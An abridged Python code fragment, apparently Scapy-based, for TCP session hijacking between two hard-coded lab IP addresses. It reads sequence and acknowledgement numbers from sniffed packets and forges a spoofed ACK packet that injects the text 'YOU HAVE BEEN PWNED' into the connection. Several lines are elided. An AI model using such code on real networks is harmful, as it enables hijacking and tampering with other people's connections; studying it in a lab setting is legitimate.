...
def main():
    ...
    dict = {}
    IPSTOHIJACK = ["192.168.36.134","192.168.36.129"]
    headerLength = 20
    while 1:
        ...
        if packet.haslayer(TCP):
            if packet.haslayer(IP):
                ...
                if (IPsrc in IPSTOHIJACK and IPdst in IPSTOHIJACK):
                    ...
                    payload = "YOU HAVE BEEN PWNED"
                    print str(IPsrc)+" --> " + str(IPdst) + ",SEQ: " + str(seq) + ",ACK: " + str(ack) + " with packet size of " + str(size) + " : " +str(tcpPacket.payload).encode("hex")
                    spoofedPkt = Ether()/IP(src=IPdst,dst=IPsrc)/TCP(sport=dstPort,dport=srcPort,seq=ack,ack=seq+size,flags='A')/Raw(load=payload)
